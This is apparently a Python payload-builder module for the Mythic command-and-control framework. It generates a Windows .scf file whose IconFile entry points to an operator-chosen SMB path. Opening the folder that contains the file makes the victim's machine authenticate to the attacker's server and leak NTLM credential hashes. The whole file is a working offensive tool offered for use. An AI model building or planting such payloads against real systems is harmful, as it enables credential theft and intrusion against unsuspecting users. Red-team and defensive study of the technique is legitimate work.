import logging
import pathlib
import traceback
from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json
import os
import shutil
import base64
import random

class scf_smb_auth(PayloadType):
    name = "scf_smb_auth"
    file_extension = "scf"
    author = "@hegusung"
    supported_os = [SupportedOS.Windows]
    wrapper = False
    wrapped_payloads = ["jscript_download_save_execute"]
    note = """Creates a SCF payload that will generate a SMB authentication to a remote server"""
    supports_dynamic_loading = True
    c2_profiles = []
    mythic_encrypts = True
    translation_container = None # "myPythonTranslation"
    agent_path = pathlib.Path(".") / "file"
    agent_icon_path = agent_path / "agent_functions" / "file.svg"
    agent_code_path = agent_path / "agent_code"
    build_parameters = [
        BuildParameter(
            name = "smb_path",
            parameter_type=BuildParameterType.String,
            description="Payload SMB Path",
        ),
    ]

    build_steps = [
    ]

    async def build(self) -> BuildResponse:
        # this function gets called to create an instance of your payload
        resp = BuildResponse(status=BuildStatus.Success)
        # create the payload
        build_msg = ""

        try:

            smb_path = self.get_parameter('smb_path')
         
            payload = """[Shell]
Command=2
IconFile={smb_path}
[Taskbar]
Command=ToggleDesktop"""

            resp.payload = payload.format(smb_path=smb_path)
            resp.build_message = "Successfully built!\n"

        except Exception as e:
            traceback.print_exc()

            resp.set_status(BuildStatus.Error)
            resp.build_stderr = "Error building payload: " + str(e)
        return resp
